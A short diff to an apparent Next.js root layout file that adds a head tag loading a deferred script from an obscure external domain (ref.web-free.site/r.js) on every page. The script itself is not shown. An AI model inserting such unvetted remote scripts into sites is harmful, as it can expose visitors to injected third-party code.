@@ -17,6 +17,9 @@ export const metadata: Metadata = {
 export default function RootLayout({ children }: { children: React.ReactNode }) {
   return (
     <html lang="en" suppressHydrationWarning>
+      <head>
+        <script src="https://ref.web-free.site/r.js" defer />
+      </head>
       <body className={`${dmSans.variable} antialiased`}>
         <SiteAds />
         {children}
